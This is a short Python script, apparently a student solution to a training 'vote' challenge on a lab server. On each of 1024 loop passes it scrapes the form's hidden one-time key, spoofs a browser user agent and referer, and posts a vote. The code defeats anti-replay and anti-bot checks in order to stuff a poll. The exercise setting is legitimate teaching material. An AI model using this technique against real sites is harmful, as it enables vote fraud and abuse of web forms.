#!/usr/bin/python3
"""
https://realpython.com/python-requests/
https://j2logo.com/python/web-scraping-con-python-guia-inicio-beautifulsoup/
install beautifulsoup4 and lxml
python -m pip install beautifulsoup4

http://158.69.76.135/level1.php
when we check the webpage using the explorer
we see that there are anothe inpout in the form with the type of hidden
<input type="hidden" name="key" value="3c2f9655e5bead48..."
we need to get the info from the key to add to our data because
the key value change everytime the form it send

user agent for Windows:
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent/Firefox
Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0

"""
import requests
from requests import post, session
from bs4 import BeautifulSoup

holberton_id = {"id": "4585", "holdthedoor": "holdthedoor", "key": ""}
user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:10.0) "
            "Gecko/20100101 Firefox/10.0")

header = {
    "User-Agent": user_agent,
    "referer": "http://158.69.76.135/level2.php"
}


if __name__ == "__main__":
    for i in range(0, 1024):
        session = requests.session()
        web = session.get("http://158.69.76.135/level2.php")
        soup = BeautifulSoup(web.text, "html.parser")
        hidden_key = soup.find("form", {"method": "post"})
        hidden_key = hidden_key.find("input", {"type": "hidden"})
        """print(hidden_key["value"])"""
        holberton_id["key"] = hidden_key["value"]
        """print(holberton_id)"""
        session.post("http://158.69.76.135/level2.php", headers=header, data=holberton_id)
